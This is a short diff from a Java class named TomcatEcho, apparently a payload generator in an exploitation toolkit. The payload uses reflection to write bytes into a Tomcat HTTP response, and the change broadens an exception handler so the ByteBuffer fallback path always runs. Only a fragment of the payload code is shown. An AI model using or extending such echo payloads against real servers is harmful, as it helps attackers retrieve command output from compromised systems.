@@ -23,7 +23,7 @@ public class TomcatEcho implements EchoPayload {
                 "            var2 = var3.newInstance();\n" +
                 "            var3.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(var2, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
                 "            var0.getClass().getMethod(\"doWrite\", new Class[]{var3}).invoke(var0, new Object[]{var2});\n" +
-                "        } catch (ClassNotFoundException var5) {\n" +
+                "        } catch (Exception var5) {\n" +
                 "            var3 = Class.forName(\"java.nio.ByteBuffer\");\n" +
                 "            var2 = var3.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(var3, new Object[]{bs});\n" +
                 "            var0.getClass().getMethod(\"doWrite\", new Class[]{var3}).invoke(var0, new Object[]{var2});\n" +
